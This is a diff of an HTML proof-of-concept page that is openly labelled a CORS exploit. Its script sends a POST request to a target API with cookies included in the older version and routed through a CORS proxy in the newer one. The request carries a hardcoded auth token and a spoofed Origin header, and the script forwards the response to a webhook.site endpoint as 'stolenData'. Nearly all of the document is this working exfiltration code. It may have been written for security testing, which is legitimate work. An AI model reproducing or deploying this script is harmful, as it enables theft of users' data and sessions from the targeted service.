@@ -1,57 +1,70 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exploit</title>
+    <title>CORS Exploit Test</title>
     <script>
         // Log the start of the script
-        console.log("Exploit script loaded and running...");
+        console.log("CORS Exploit Test script loaded and running...");
 
         // Define the target endpoint and payload
-        const targetURL = "https://api.company-target.com/api/v3/ip.json?referrer=&page=https%3A%2F%2Fevgen.appsflyer.com%2F%3Furl%3Dgoogle.com&page_title=In-app%20event%20generator";
+        const targetURL = "https://api.company-target.com/api/v3/ip.json";
         const webhookURL = "https://webhook.site/90a9a04b-72c9-4653-a2c2-f0a66c64559c";
 
-        // Craft the POST request to the target server
-        fetch(targetURL, {
-            method: "POST",
-            credentials: "include", // Include cookies with the request
-            headers: {
-                "Content-Type": "text/plain;charset=UTF-8",
-                "Origin": "https://varad4-0-4.github.io/covid19partnersplatform-dev/"
-            },
-            body: JSON.stringify({
-                "src": "tag",
-                "auth": "mHlqHytbs5xRhLbSvPSKl4PqNQJrYCYgov6cXimN"
-            })
-        })
-        .then(response => {
-            console.log("Response received:", response);
-            return response.text(); // Parse the response body
-        })
-        .then(data => {
-            console.log("Extracted data:", data);
+        // Use a CORS proxy to bypass restrictions
+        const proxyURL = "https://cors-anywhere.herokuapp.com/";
 
-            // Send the extracted data to the Webhook.site endpoint
-            fetch(webhookURL, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    stolenData: data
-                })
-            })
-            .then(() => console.log("Data successfully sent to Webhook.site"))
-            .catch(err => console.error("Failed to send data to Webhook.site:", err));
-        })
-        .catch(err => console.error("Exploit failed to fetch target data:", err));
+        // Function to fetch data from the target and forward to the webhook
+        async function fetchDataAndForward() {
+            try {
+                // Fetch data from the target using the proxy
+                const response = await fetch(proxyURL + targetURL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "Origin": "https://varad4-0-4.github.io/covid19partnersplatform-dev/"
+                    },
+                    body: JSON.stringify({
+                        src: "tag",
+                        auth: "mHlqHytbs5xRhLbSvPSKl4PqNQJrYCYgov6cXimN"
+                    })
+                });
+
+                if (!response.ok) {
+                    throw new Error(`Target fetch failed: ${response.status} ${response.statusText}`);
+                }
+
+                // Parse the response data
+                const data = await response.json();
+                console.log("Extracted data from target:", data);
+
+                // Forward the extracted data to the webhook
+                const webhookResponse = await fetch(webhookURL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({ stolenData: data })
+                });
+
+                if (!webhookResponse.ok) {
+                    throw new Error(`Webhook send failed: ${webhookResponse.status} ${webhookResponse.statusText}`);
+                }
+
+                console.log("Data successfully sent to Webhook.site");
+            } catch (err) {
+                console.error("Error occurred:", err);
+            }
+        }
+
+        // Call the function to start the exploit
+        fetchDataAndForward();
     </script>
 </head>
 <body>
-    <h1>Loading Exploit...</h1>
-    <p>If you see this message, the exploit is running. Check the browser console and Webhook.site for results.</p>
+    <h1>CORS Exploit Test</h1>
+    <p>Check the browser console and Webhook.site for results.</p>
 </body>
 </html>
-
 
 
 <!-- <!DOCTYPE html>
